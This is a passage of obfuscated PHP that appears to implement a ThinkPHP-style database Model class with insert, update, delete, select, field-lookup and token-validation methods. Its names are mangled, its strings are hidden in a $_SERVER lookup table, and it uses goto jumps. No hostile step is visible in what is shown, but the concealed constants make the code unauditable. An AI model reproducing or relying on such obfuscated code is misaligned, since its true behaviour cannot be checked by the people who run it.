$ĞæºÒÚ„ = 0; $ÊÉ©Ãß… = 5000; for ($ëçş¬«µ = 0; $ëçş¬«µ < $ÊñıÎâÖ; $ëçş¬«µ = $ëçş¬«µ + $ÊÉ©Ãß…) { $İ«œÙ = $this->limit($ëçş¬«µ, $ëçş¬«µ + $ÊÉ©Ãß…)->select(); foreach ($İ«œÙ as $âûÁú¬Û) { $ø‹×·Éê += $âûÁú¬Û[$šãÌÚş[79]] * $âûÁú¬Û[$šãÌÚş[2048]]; $£õßàï¾ += $âûÁú¬Û[$šãÌÚş[79]] * ($âûÁú¬Û[$šãÌÚş[2048]] - 1); $ĞæºÒÚ„ += $âûÁú¬Û[$šãÌÚş[2048]]; } } $—å•²ó¯ = array($šãÌÚş[2058] => $ø‹×·Éê, $šãÌÚş[2059] => $£õßàï¾, $šãÌÚş[2060] => $£õßàï¾ / $ø‹×·Éê, $šãÌÚş[83] => $ÊñıÎâÖ, $šãÌÚş[2061] => $ĞæºÒÚ„); return $—å•²ó¯; } } goto bÀò÷Š¹Ö¹; CÉò„•÷Õá: define($_SERVER[²Ö÷öõ][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\x72\144\145\x72", "\x61\154\x69\141\163", "\150\x61\166\151\x6e\147", "\147\162\157\165\x70", "\154\x6f\x63\x6b", "\144\151\163\164\151\x6e\143\x74", "\141\165\x74\157", "\146\x69\154\x74\x65\x72", "\x76\141\x6c\151\x64\141\x74\x65", "\162\145\x73\x75\154\164", "\x62\x69\x6e\x64", "\x74\157\153\145\156"); public function __construct($³ÑØùÖ = '', $¯Ì³§ÆÀ = '', $™‹Æ¢Ñ´ = '') { $«â·¼ =& $_SERVER[²Ö÷öõ]; $this->_initialize(); if (!empty($³ÑØùÖ)) { if (strpos($³ÑØùÖ, $«â·¼[10])) { list($this->dbName, $this->name) = explode($«â·¼[10], $³ÑØùÖ); } else { $this->name = $³ÑØùÖ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¯Ì³§ÆÀ)) { $this->tablePrefix = $«â·¼[12]; } elseif ($«â·¼[12] != $¯Ì³§ÆÀ) { $this->tablePrefix = $¯Ì³§ÆÀ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($«â·¼[321]); } $this->db(0, empty($this->connection) ? $™‹Æ¢Ñ´ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $—§¸…õ† =& $_SERVER[²Ö÷öõ]; if (empty($this->fields)) { if (think_config($—§¸…õ†[322])) { $Å†œÇ€ = $this->dbName ? $this->dbName : think_config($—§¸…õ†[323]); $¶„ÂµòÖ = think_var_cache($—§¸…õ†[324] . strtolower(get_path_this($Å†œÇ€) . $—§¸…õ†[10] . $this->name)); if ($¶„ÂµòÖ) { $€ğğ÷¨Û = think_config($—§¸…õ†[325]); if (empty($€ğğ÷¨Û) || $¶„ÂµòÖ[$—§¸…õ†[326]] == $€ğğ÷¨Û) { $this->fields = $¶„ÂµòÖ; return; } } } $this->flush(); } } public function flush() { $Ä–¬„‚¡ =& $_SERVER[²Ö÷öõ]; $this->db->setModel($this->name); $Ã¢Û™ôº = $this->db->getFields($this->getTableName()); if (!$Ã¢Û™ôº) { return !1; } $this->fields = array_keys($Ã¢Û™ôº); $this->fields[$Ä–¬„‚¡[327]] = !1; foreach ($Ã¢Û™ôº as $îÂ±ì·– => $ëÀÔğ¥) { $ã™ØœÄ[$îÂ±ì·–] = $ëÀÔğ¥[$Ä–¬„‚¡[33]]; if ($ëÀÔğ¥[$Ä–¬„‚¡[39]]) { $this->fields[$Ä–¬„‚¡[328]] = $îÂ±ì·–; if ($ëÀÔğ¥[$Ä–¬„‚¡[42]]) { $this->fields[$Ä–¬„‚¡[327]] = !0; } } } $this->fields[$Ä–¬„‚¡[329]] = $ã™ØœÄ; if (think_config($Ä–¬„‚¡[325])) { $this->fields[$Ä–¬„‚¡[326]] = think_config($Ä–¬„‚¡[325]); } if (think_config($Ä–¬„‚¡[322])) { $ùáâ¨é’ = $this->dbName ? $this->dbName : think_config($Ä–¬„‚¡[323]); think_var_cache($Ä–¬„‚¡[324] . strtolower(get_path_this($ùáâ¨é’) . $Ä–¬„‚¡[10] . $this->name), $this->fields); } } public function switchModel($ªİºí†Ô, $È‰¤¹Ü = array()) { $›ÓöÈ÷â =& $_SERVER[²Ö÷öõ]; $ê™½¦Â’ = ucwords(strtolower($ªİºí†Ô)) . $›ÓöÈ÷â[330]; if (!class_exists($ê™½¦Â’)) { think_exception($ê™½¦Â’ . think_lang($›ÓöÈ÷â[331])); } $this->_extModel = new $ê™½¦Â’($this->name); if (!empty($È‰¤¹Ü)) { foreach ($È‰¤¹Ü as $öÚÕ¼Ëİ) { $this->_extModel->setProperty($öÚÕ¼Ëİ, $this->{$öÚÕ¼Ëİ}); } } return $this->_extModel; } public function __set($êÊ×È, $‡¡Éü´) { $this->data[$êÊ×È] = $‡¡Éü´; } public function __get($µÌ¡ıˆğ) { return isset($this->data[$µÌ¡ıˆğ]) ? $this->data[$µÌ¡ıˆğ] : null; } public function __isset($óãúÜç) { return isset($this->data[$óãúÜç]); } public function __unset($ù„ê§×) { unset($this->data[$ù„ê§×]); } public function __call($±¹øá“Ä, $Ñ®“Û©Í) { $ˆÔÄ³õ =& $_SERVER[²Ö÷öõ]; if (in_array(strtolower($±¹øá“Ä), $this->methods, !0)) { $this->options[strtolower($±¹øá“Ä)] = $Ñ®“Û©Í[0]; return $this; } elseif (in_array(strtolower($±¹øá“Ä), array($ˆÔÄ³õ[332], $ˆÔÄ³õ[333], $ˆÔÄ³õ[334], $ˆÔÄ³õ[335], $ˆÔÄ³õ[336]), !0)) { $––¾ÈÃÔ = isset($Ñ®“Û©Í[0]) ? $Ñ®“Û©Í[0] : $ˆÔÄ³õ[220]; $––¾ÈÃÔ = $this->db->parseKey($––¾ÈÃÔ); return $this->getField(strtoupper($±¹øá“Ä) . $ˆÔÄ³õ[337] . $––¾ÈÃÔ . $ˆÔÄ³õ[338] . $±¹øá“Ä, $ˆÔÄ³õ[332]); } elseif (strtolower(substr($±¹øá“Ä, 0, 5)) == $ˆÔÄ³õ[339]) { $––¾ÈÃÔ = think_parse_name(substr($±¹øá“Ä, 5)); $´ê¢í÷‹[$––¾ÈÃÔ] = $Ñ®“Û©Í[0]; return $this->where($´ê¢í÷‹)->find(); } elseif (strtolower(substr($±¹øá“Ä, 0, 10)) == $ˆÔÄ³õ[340]) { $ÜÜ£©ªë = think_parse_name(substr($±¹øá“Ä, 10)); $´ê¢í÷‹[$ÜÜ£©ªë] = $Ñ®“Û©Í[0]; return $this->where($´ê¢í÷‹)->getField($Ñ®“Û©Í[1]); } elseif (isset($this->_scope[$±¹øá“Ä])) { return $this->scope($±¹øá“Ä, $Ñ®“Û©Í[0]); } elseif (method_exists($this, $±¹øá“Ä)) { array_unshift($Ñ®“Û©Í, $±¹øá“Ä); return call_user_func_array(array($this, $ˆÔÄ³õ[341]), $Ñ®“Û©Í); } else { return call_user_func_array(array(parent, $±¹øá“Ä), $Ñ®“Û©Í); } } protected function call() { $¦”­ôÈö =& $_SERVER[²Ö÷öõ]; $µŸ•• = func_get_args(); $õ¥Øë• = array_shift($µŸ••); $Ç„„äÔş = $õ¥Øë•; if (is_array($õ¥Øë•)) { $Ç„„äÔş = $õ¥Øë•[1]; $õ¥Øë• = $õ¥Øë•[0]; } $ûÆ‹ıú = count($µŸ••) - 1; if (isset($µŸ••[$ûÆ‹ıú]) && $µŸ••[$ûÆ‹ıú] === $õ¥Øë•) { think_exception(__CLASS__ . $¦”­ôÈö[4] . $õ¥Øë• . think_lang($¦”­ôÈö[342])); return; } $µŸ••[] = $õ¥Øë•; if (method_exists($this, $¦”­ôÈö[343])) { $â—¨º‰ = call_user_func_array(array($this, $¦”­ôÈö[344]), array($Ç„„äÔş, $µŸ••)); if (!is_null($â—¨º‰) && $â—¨º‰ !== !1) { return $â—¨º‰; } } $Ñ‹ÈéÏ = call_user_func_array(array($this, $õ¥Øë•), $µŸ••); if (method_exists($this, $¦”­ôÈö[345])) { $â—¨º‰ = call_user_func_array(array($this, $¦”­ôÈö[346]), array($Ç„„äÔş, $µŸ••, $Ñ‹ÈéÏ)); if ($â—¨º‰) { return $â—¨º‰; } } return $Ñ‹ÈéÏ; } protected function _initialize() { } protected function _facade($õŸÆ¢â) { $¹ô¢Œøµ =& $_SERVER[²Ö÷öõ]; if (!empty($this->fields)) { foreach ($õŸÆ¢â as $™É´ıÎã => $ôç„Åê) { if (is_array($this->fields) && !in_array($™É´ıÎã, $this->fields, !0)) { unset($õŸÆ¢â[$™É´ıÎã]); } elseif (is_scalar($ôç„Åê)) { $this->_parseType($õŸÆ¢â, $™É´ıÎã); } } } if (!empty($this->options[$¹ô¢Œøµ[347]])) { $õŸÆ¢â = array_map($this->options[$¹ô¢Œøµ[347]], $õŸÆ¢â); unset($this->options[$¹ô¢Œøµ[347]]); } $this->_beforeWrite($õŸÆ¢â); return $õŸÆ¢â; } protected function _beforeWrite(&$šºÕ³ÏÖ) { } public function add($¼¢¥¦±’ = '', $¥ÚÎ¶Ğå = array(), $®á£ÙÀÒ = false) { if (empty($¼¢¥¦±’)) { if (!empty($this->data)) { $¼¢¥¦±’ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[²Ö÷öõ][348]); return !1; } } $¥ÚÎ¶Ğå = $this->_parseOptions($¥ÚÎ¶Ğå); $¼¢¥¦±’ = $this->_facade($¼¢¥¦±’); if (!1 === $this->_beforeInsert($¼¢¥¦±’, $¥ÚÎ¶Ğå)) { return !1; } $¾Š¾¬ö = $this->db->insert($¼¢¥¦±’, $¥ÚÎ¶Ğå, $®á£ÙÀÒ); if (!1 !== $¾Š¾¬ö) { $ğé±¿Á… = $this->getLastInsID(); if ($ğé±¿Á…) { $¼¢¥¦±’[$this->getPk()] = $ğé±¿Á…; $this->_after_insert($¼¢¥¦±’, $¥ÚÎ¶Ğå); return $ğé±¿Á…; } $this->_after_insert($¼¢¥¦±’, $¥ÚÎ¶Ğå); } return $¾Š¾¬ö; } protected function _beforeInsert(&$óÃäğÍã, $…ôŒ—¸) { } protected function _after_insert($Ş«±¦Ôş, $ÚÇï´›‹) { } public function addAll($Íª†„äê, $¬û“õ…× = array(), $ô¶˜‚„î = false) { $ûå™û¤— =& $_SERVER[²Ö÷öõ]; if (empty($Íª†„äê)) { $this->error = think_lang($ûå™û¤—[348]); return !1; } $¬û“õ…× = $this->_parseOptions($¬û“õ…×); foreach ($Íª†„äê as $Ñ‰œäÒ… => $ªÒ ¼Š) { $Íª†„äê[$Ñ‰œäÒ…] = $this->_facade($ªÒ ¼Š); } if (method_exists($this->db, $ûå™û¤—[349])) { $†±€—— = $this->db->insertAll($Íª†„äê, $¬û“õ…×, $ô¶˜‚„î); } else { $this->startTrans(); foreach ($Íª†„äê as $Ñ‰œäÒ… => $ªÒ ¼Š) { $†±€—— = $this->db->insert($ªÒ ¼Š, $¬û“õ…×, $ô¶˜‚„î); } $this->commit(); } if (!1 !== $†±€——) { $¥¿€±‘ = $this->getLastInsID(); if ($¥¿€±‘) { return $¥¿€±‘; } } return $†±€——; } public function selectAdd($‰±Åí¹ú = '', $›Âï‚ìÉ = '', $è»¤ş–ş = array()) { $Ø¼ÄÜ¿ˆ =& $_SERVER[²Ö÷öõ]; $è»¤ş–ş = $this->_parseOptions($è»¤ş–ş); if (!1 === ($ş¢¾óÁ = $this->db->selectInsert($‰±Åí¹ú ? $‰±Åí¹ú : $è»¤ş–ş[$Ø¼ÄÜ¿ˆ[350]], $›Âï‚ìÉ ? $›Âï‚ìÉ : $this->getTableName(), $è»¤ş–ş))) { $this->error = think_lang($Ø¼ÄÜ¿ˆ[351]); return !1; } else { return $ş¢¾óÁ; } } public function save($¯Û»¶öÈ = '', $ÇŞØâ¬ô = array()) { $âĞ˜—Ş =& $_SERVER[²Ö÷öõ]; if (empty($¯Û»¶öÈ)) { if (!empty($this->data)) { $¯Û»¶öÈ = $this->data; $this->data = array(); } else { $this->error = think_lang($âĞ˜—Ş[348]); return !1; } } $¯Û»¶öÈ = $this->_facade($¯Û»¶öÈ); $ÇŞØâ¬ô = $this->_parseOptions($ÇŞØâ¬ô); $¢Ù¡ ıÎ = $this->getPk(); if (!isset($ÇŞØâ¬ô[$âĞ˜—Ş[352]])) { if (isset($¯Û»¶öÈ[$¢Ù¡ ıÎ])) { $‘¶ÚÇı¬[$¢Ù¡ ıÎ] = $¯Û»¶öÈ[$¢Ù¡ ıÎ]; $ÇŞØâ¬ô[$âĞ˜—Ş[352]] = $‘¶ÚÇı¬; unset($¯Û»¶öÈ[$¢Ù¡ ıÎ]); } else { $this->error = think_lang($âĞ˜—Ş[351]); return !1; } } if (is_array($ÇŞØâ¬ô[$âĞ˜—Ş[352]]) && isset($ÇŞØâ¬ô[$âĞ˜—Ş[352]][$¢Ù¡ ıÎ])) { $Î°êÓÖ = $ÇŞØâ¬ô[$âĞ˜—Ş[352]][$¢Ù¡ ıÎ]; } if (!1 === $this->_beforeUpdate($¯Û»¶öÈ, $ÇŞØâ¬ô)) { return !1; } $¸‚²î×ı = $this->db->update($¯Û»¶öÈ, $ÇŞØâ¬ô); if (!1 !== $¸‚²î×ı) { if (isset($Î°êÓÖ)) { $¯Û»¶öÈ[$¢Ù¡ ıÎ] = $Î°êÓÖ; } $this->_afterUpdate($¯Û»¶öÈ, $ÇŞØâ¬ô); } return $¸‚²î×ı; } protected function _beforeUpdate(&$ó—ºË, $…ò—Öş) { } protected function _afterUpdate($¿®¹€ğ©, $Ã¢ŞÓğõ) { } public function delete($©ÌÊû¥ = array()) { $¯¬ŒÑòë =& $_SERVER[²Ö÷öõ]; if (empty($©ÌÊû¥) && empty($this->options[$¯¬ŒÑòë[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $šáÄ¦‘à = $this->getPk(); if (is_numeric($©ÌÊû¥) || is_string($©ÌÊû¥)) { if (strpos($©ÌÊû¥, $¯¬ŒÑòë[50])) { $»‡Ò´Ùå[$šáÄ¦‘à] = array($¯¬ŒÑòë[353], $©ÌÊû¥); } else { $»‡Ò´Ùå[$šáÄ¦‘à] = $©ÌÊû¥; } $this->options[$¯¬ŒÑòë[352]] = $»‡Ò´Ùå; } $©ÌÊû¥ = $this->_parseOptions(); if (is_array($©ÌÊû¥[$¯¬ŒÑòë[352]]) && isset($©ÌÊû¥[$¯¬ŒÑòë[352]][$šáÄ¦‘à])) { $¸ì’´ìˆ = $©ÌÊû¥[$¯¬ŒÑòë[352]][$šáÄ¦‘à]; } $ßŒà·õ¶ = $this->db->delete($©ÌÊû¥); if (!1 !== $ßŒà·õ¶) { $Ÿ¦ƒÂÆ” = array(); if (isset($¸ì’´ìˆ)) { $Ÿ¦ƒÂÆ”[$šáÄ¦‘à] = $¸ì’´ìˆ; } $this->_after_delete($Ÿ¦ƒÂÆ”, $©ÌÊû¥); } return $ßŒà·õ¶; } protected function _after_delete($…²‹ë¯Ù, $›ªáñä®) { } public function select($Éß¿Œô = array()) { $‚‰é€ò¢ =& $_SERVER[²Ö÷öõ]; if (is_string($Éß¿Œô) || is_numeric($Éß¿Œô)) { $§µĞ­äİ = $this->getPk(); if (strpos($Éß¿Œô, $‚‰é€ò¢[50])) { $¹¶ëşÏ[$§µĞ­äİ] = array($‚‰é€ò¢[353], $Éß¿Œô); } else { $¹¶ëşÏ[$§µĞ­äİ] = $Éß¿Œô; } $this->options[$‚‰é€ò¢[352]] = $¹¶ëşÏ; } elseif (!1 === $Éß¿Œô) { $Éß¿Œô = $this->_parseOptions(); return $‚‰é€ò¢[354] . $this->db->buildSelectSql($Éß¿Œô) . $‚‰é€ò¢[355]; } $Éß¿Œô = $this->_parseOptions(); $Œà¬¨Î¤ = $this->db->select($Éß¿Œô); if (!1 === $Œà¬¨Î¤) { return !1; } if (empty($Œà¬¨Î¤)) { return null; } $this->_afterSelect($Œà¬¨Î¤, $Éß¿Œô); return $Œà¬¨Î¤; } protected function _afterSelect(&$Öˆ‡Ñæ, $ñ‹íÊìÍ) { } public function buildSql($¶¢Æö“ = array()) { $¼²Ê¤Òˆ =& $_SERVER[²Ö÷öõ]; $¶¢Æö“ = $this->_parseOptions($¶¢Æö“); return $¼²Ê¤Òˆ[354] . $this->db->buildSelectSql($¶¢Æö“) . $¼²Ê¤Òˆ[355]; } public function optionsValue($á¸£÷”ì = null) { if (is_null($á¸£÷”ì)) { return $this->options; } elseif (is_array($á¸£÷”ì)) { $this->options = array_merge($this->options, $á¸£÷”ì); } } protected function _parseOptions($ñÄØ¼äÏ = array()) { $ëÛôöË¡ =& $_SERVER[²Ö÷öõ]; if (is_array($ñÄØ¼äÏ)) { $ñÄØ¼äÏ = array_merge($this->options, $ñÄØ¼äÏ); } $this->options = array(); if (!isset($ñÄØ¼äÏ[$ëÛôöË¡[356]])) { $ñÄØ¼äÏ[$ëÛôöË¡[356]] = $this->getTableName(); $Š„ÛäÆ— = $this->fields; } else { $Š„ÛäÆ— = $this->getDbFields(); } if (!empty($ñÄØ¼äÏ[$ëÛôöË¡[357]])) { $ñÄØ¼äÏ[$ëÛôöË¡[356]] .= $ëÛôöË¡[53] . $ñÄØ¼äÏ[$ëÛôöË¡[357]]; } $ñÄØ¼äÏ[$ëÛôöË¡[358]] = $this->name; if (isset($ñÄØ¼äÏ[$ëÛôöË¡[352]]) && is_array($ñÄØ¼äÏ[$ëÛôöË¡[352]]) && !empty($Š„ÛäÆ—) && !isset($ñÄØ¼äÏ[$ëÛôöË¡[359]]) && !isset($ñÄØ¼äÏ[$ëÛôöË¡[356]])) { foreach ($ñÄØ¼äÏ[$ëÛôöË¡[352]] as $…İİïïì => $èÖöˆ¾Ç) { $…İİïïì = trim($…İİïïì); if (in_array($…İİïïì, $Š„ÛäÆ—, !0)) { if (is_scalar($èÖöˆ¾Ç)) { $this->_parseType($ñÄØ¼äÏ[$ëÛôöË¡[352]], $…İİïïì); } } elseif (!is_numeric($…İİïïì) && $ëÛôöË¡[11] != substr($…İİïïì, 0, 1) && !1 === strpos($…İİïïì, $ëÛôöË¡[10]) && !1 === strpos($…İİïïì, $ëÛôöË¡[337]) && !1 === strpos($…İİïïì, $ëÛôöË¡[214]) && !1 === strpos($…İİïïì, $ëÛôöË¡[360])) { unset($ñÄØ¼äÏ[$ëÛôöË¡[352]][$…İİïïì]); } } } $this->_options_filter($ñÄØ¼äÏ); return $ñÄØ¼äÏ; } protected function _options_filter(&$¾€•Ç¸ª) { } protected function _parseType(&$Åá€ˆÈƒ, $¾šœã) { $Šï’ìõ =& $_SERVER[²Ö÷öõ]; if (empty($this->options[$Šï’ìõ[361]][$Šï’ìõ[4] . $¾šœã])) { $†¬¡¼”Æ = strtolower($this->fields[$Šï’ìõ[329]][$¾šœã]); if (!1 !== strpos($†¬¡¼”Æ, $Šï’ìõ[362])) { } elseif (!1 === strpos($†¬¡¼”Æ, $Šï’ìõ[363]) && !1 !== strpos($†¬¡¼”Æ, $Šï’ìõ[364])) { $Åá€ˆÈƒ[$¾šœã] = intval($Åá€ˆÈƒ[$¾šœã]); } elseif (!1 !== strpos($†¬¡¼”Æ, $Šï’ìõ[365]) || !1 !== strpos($†¬¡¼”Æ, $Šï’ìõ[366])) { $Åá€ˆÈƒ[$¾šœã] = floatval($Åá€ˆÈƒ[$¾šœã]); } elseif (!1 !== strpos($†¬¡¼”Æ, $Šï’ìõ[367])) { $Åá€ˆÈƒ[$¾šœã] = (bool) $Åá€ˆÈƒ[$¾šœã]; } } } public function find($€¸ÅÏô = array()) { $ÙæÚîø‰ =& $_SERVER[²Ö÷öõ]; if (is_numeric($€¸ÅÏô) || is_string($€¸ÅÏô)) { $®ÃÂøÄ’[$this->getPk()] = intval($€¸ÅÏô); $this->options[$ÙæÚîø‰[352]] = $®ÃÂøÄ’; } $this->options[$ÙæÚîø‰[368]] = 1; $€¸ÅÏô = $this->_parseOptions(); $ÜçÁ¼åù = $this->db->select($€¸ÅÏô); if (!1 === $ÜçÁ¼åù) { return !1; } if (empty($ÜçÁ¼åù)) { return null; } $this->data = $ÜçÁ¼åù[0]; $this->_afterFind($this->data, $€¸ÅÏô); if (!empty($this->options[$ÙæÚîø‰[369]])) { return $this->returnResult($this->data, $this->options[$ÙæÚîø‰[369]]); } return $this->data; } protected function _afterFind(&$Ê™Èîô, $àŸĞõôà) { } protected function returnResult($ÑÂ¾ãğç, $ä£€ùò = '') { $ì„ï‡æ£ =& $_SERVER[²Ö÷öõ]; if ($ä£€ùò) { if (is_callable($ä£€ùò)) { return call_user_func($ä£€ùò, $ÑÂ¾ãğç); } switch (strtolower($ä£€ùò)) { case $ì„ï‡æ£[370]: return json_encode($ÑÂ¾ãğç); case $ì„ï‡æ£[371]: return xml_encode($ÑÂ¾ãğç); } } return $ÑÂ¾ãğç; } public function parseFieldsMap($Â¤ıáÄË, $½Ü—¥¢ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $–•í¾Ìª => $ÖÉ‹‡á¸) { if ($½Ü—¥¢ == 1) { if (isset($Â¤ıáÄË[$ÖÉ‹‡á¸])) { $Â¤ıáÄË[$–•í¾Ìª] = $Â¤ıáÄË[$ÖÉ‹‡á¸]; unset($Â¤ıáÄË[$ÖÉ‹‡á¸]); } } else { if (isset($Â¤ıáÄË[$–•í¾Ìª])) { $Â¤ıáÄË[$ÖÉ‹‡á¸] = $Â¤ıáÄË[$–•í¾Ìª]; unset($Â¤ıáÄË[$–•í¾Ìª]); } } } } return $Â¤ıáÄË; } public function setField($ŞÊì¹‰Î, $àÜÔ¿Ô = '') { if (is_array($ŞÊì¹‰Î)) { $«×ôªİÄ = $ŞÊì¹‰Î; } else { $«×ôªİÄ[$ŞÊì¹‰Î] = $àÜÔ¿Ô; } return $this->save($«×ôªİÄ); } public function setAdd($ˆ—ì€²Ø, $¢úõäß÷ = 1) { $—ƒ¥ŞÃ· =& $_SERVER[²Ö÷öõ]; $ıÉ”¤† = $ˆ—ì€²Ø . $—ƒ¥ŞÃ·[372] . $¢úõäß÷; if ($¢úõäß÷ < 0) { $ıÉ”¤† = $ˆ—ì€²Ø . $¢úõäß÷; } return $this->setField($ˆ—ì€²Ø, array($—ƒ¥ŞÃ·[373], $ıÉ”¤†)); } public function getField($‘Ê‡Äş¹, $´Ôå°ö± = null) { $É®ø¢Ñ× =& $_SERVER[²Ö÷öõ]; $—»Î§¾¡[$É®ø¢Ñ×[350]] = $‘Ê‡Äş¹; $—»Î§¾¡ = $this->_parseOptions($—»Î§¾¡); $‘Ê‡Äş¹ = trim($‘Ê‡Äş¹); if (strpos($‘Ê‡Äş¹, $É®ø¢Ñ×[50])) { if (!isset($—»Î§¾¡[$É®ø¢Ñ×[368]])) { $—»Î§¾¡[$É®ø¢Ñ×[368]] = is_numeric($´Ôå°ö±) ? $´Ôå°ö± : $É®ø¢Ñ×[12]; } $íøÍ¥ = $this->db->select($—»Î§¾¡); if (!empty($íøÍ¥)) { $ı¹á¦ë² = explode($É®ø¢Ñ×[50], $‘Ê‡Äş¹); $‘Ê‡Äş¹ = array_keys($íøÍ¥[0]); $İ×ğªºì = array_shift($‘Ê‡Äş¹); $³ÁÑû¡É = array_shift($‘Ê‡Äş¹); $†¡¢ŞÔç = array(); $ÒÀşêÇ = count($ı¹á¦ë²); foreach ($íøÍ¥ as $ïï™¾¼ƒ) { $…Õ¼Ë° = $ïï™¾¼ƒ[$İ×ğªºì]; if (2 == $ÒÀşêÇ) { $†¡¢ŞÔç[$…Õ¼Ë°] = $ïï™¾¼ƒ[$³ÁÑû¡É]; } else { $†¡¢ŞÔç[$…Õ¼Ë°] = is_string($´Ôå°ö±) ? implode($´Ôå°ö±, $ïï™¾¼ƒ) : $ïï™¾¼ƒ; } } return $†¡¢ŞÔç; } } else { if (!0 !== $´Ôå°ö±) { $—»Î§¾¡[$É®ø¢Ñ×[368]] = is_numeric($´Ôå°ö±) ? $´Ôå°ö± : 1; } if ($´Ôå°ö± === $É®ø¢Ñ×[332]) { unset($—»Î§¾¡[$É®ø¢Ñ×[368]]); } $ïï™¾¼ƒ = $this->db->select($—»Î§¾¡); if (!empty($ïï™¾¼ƒ)) { if ($´Ôå°ö± === $É®ø¢Ñ×[332]) { return reset($ïï™¾¼ƒ[0]); } if (!0 !== $´Ôå°ö± && 1 == $—»Î§¾¡[$É®ø¢Ñ×[368]]) { return reset($ïï™¾¼ƒ[0]); } foreach ($ïï™¾¼ƒ as $ŞÔî²ú“) { $—Èë¨Ÿ°[] = $ŞÔî²ú“[$‘Ê‡Äş¹]; } return $—Èë¨Ÿ°; } } return null; } public function create($˜¼Š‚ö  = '', $ßÅ§é« = '') { $Æ²½³ß =& $_SERVER[²Ö÷öõ]; if (empty($˜¼Š‚ö )) { $˜¼Š‚ö  = $_POST; } elseif (is_object($˜¼Š‚ö )) { $˜¼Š‚ö  = get_object_vars($˜¼Š‚ö ); } if (empty($˜¼Š‚ö ) || !is_array($˜¼Š‚ö )) { $this->error = think_lang($Æ²½³ß[348]); return !1; } $˜¼Š‚ö  = $this->parseFieldsMap($˜¼Š‚ö , 0); $ßÅ§é« = $ßÅ§é« ? $ßÅ§é« : (!empty($˜¼Š‚ö [$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Æ²½³ß[350]])) { $ÓˆÌëÃ = $this->options[$Æ²½³ß[350]]; unset($this->options[$Æ²½³ß[350]]); } elseif ($ßÅ§é« == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÓˆÌëÃ = $this->insertFields; } elseif ($ßÅ§é« == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÓˆÌëÃ = $this->updateFields; } if (isset($ÓˆÌëÃ)) { if (is_string($ÓˆÌëÃ)) { $ÓˆÌëÃ = explode($Æ²½³ß[50], $ÓˆÌëÃ); } if (think_config($Æ²½³ß[374])) { $ÓˆÌëÃ[] = think_config($Æ²½³ß[375]); } foreach ($˜¼Š‚ö  as $ä¦ˆı¥ => $–¿²ªˆû) { if (!in_array($ä¦ˆı¥, $ÓˆÌëÃ)) { unset($˜¼Š‚ö [$ä¦ˆı¥]); } } } if (!$this->autoValidation($˜¼Š‚ö , $ßÅ§é«)) { return !1; } if (!$this->autoCheckToken($˜¼Š‚ö )) { $this->error = think_lang($Æ²½³ß[376]); return !1; } if ($this->autoCheckFields) { $ÓˆÌëÃ = $this->getDbFields(); foreach ($˜¼Š‚ö  as $ä¦ˆı¥ => $–¿²ªˆû) { if (!in_array($ä¦ˆı¥, $ÓˆÌëÃ)) { unset($˜¼Š‚ö [$ä¦ˆı¥]); } elseif (MAGIC_QUOTES_GPC && is_string($–¿²ªˆû)) { $˜¼Š‚ö [$ä¦ˆı¥] = stripslashes($–¿²ªˆû); } } } $this->autoOperation($˜¼Š‚ö , $ßÅ§é«); $this->data = $˜¼Š‚ö ; return $˜¼Š‚ö ; } public function autoCheckToken($¸Ãı”Ãè) { $œŞ›È­Á =& $_SERVER[²Ö÷öõ]; if (isset($this->options[$œŞ›È­Á[377]]) && !$this->options[$œŞ›È­Á[377]]) { return !0; } if (think_config($œŞ›È­Á[374])) { $¿……îÉÇ = think_config($œŞ›È­Á[375]); if (!isset($¸Ãı”Ãè[$¿……îÉÇ]) || Session::get($¿……îÉÇ)) { return !1; } list($ÔÜ›÷„ç, $«Æ¯”ç) = explode($œŞ›È­Á[11], $¸Ãı”Ãè[$¿……îÉÇ]); if ($«Æ¯”ç && Session::get($¿……îÉÇ . $œŞ›È­Á[10] . $ÔÜ›÷„ç) === $«Æ¯”ç) { Session::remove($¿……îÉÇ . $œŞ›È­Á[10] . $ÔÜ›÷„ç); return !0; } if (think_config($œŞ›È­Á[378])) { Session::remove($¿……îÉÇ . $œŞ›È­Á[10] . $ÔÜ›÷„ç); } return !1; } return !0; } public function regex($ã òËµı, $Â×¯º‘) { $İ‹¶Ò× =& $_SERVER[²Ö÷öõ]; $óëûˆ¿ = array($İ‹¶Ò×[379] => $İ‹¶Ò×[380], $İ‹¶Ò×[381] => $İ‹¶Ò×[382], $İ‹¶Ò×[383] => $İ‹¶Ò×[384], $İ‹¶Ò×[385] => $İ‹¶Ò×[386], $İ‹¶Ò×[387] => $İ‹¶Ò×[388], $İ‹¶Ò×[389] => $İ‹¶Ò×[390], $İ‹¶Ò×[391] => $İ‹¶Ò×[392], $İ‹¶Ò×[366] => $İ‹¶Ò×[393], $İ‹¶Ò×[394] => $İ‹¶Ò×[395]); if (isset($óëûˆ¿[strtolower($Â×¯º‘)])) { $Â×¯º‘ = $óëûˆ¿[strtolower($Â×¯º‘)]; } return preg_match($Â×¯º‘, $ã òËµı) === 1; } private function autoOperation(&$ëÄÓ£‘, $ùÙÄı±Î) { $ı‡ÏìêÌ =& $_SERVER[²Ö÷öõ]; if (!empty($this->options[$ı‡ÏìêÌ[396]])) { $ş„™Â£Ï = $this->options[$ı‡ÏìêÌ[396]]; unset($this->options[$ı‡ÏìêÌ[396]]); } elseif (!empty($this->_auto)) { $ş„™Â£Ï = $this->_auto; } if (isset($ş„™Â£Ï)) { foreach ($ş„™Â£Ï as $³ö´Ÿá£) { if (empty($³ö´Ÿá£[2])) { $³ö´Ÿá£[2] = THINK_MODEL_INSERT; } if 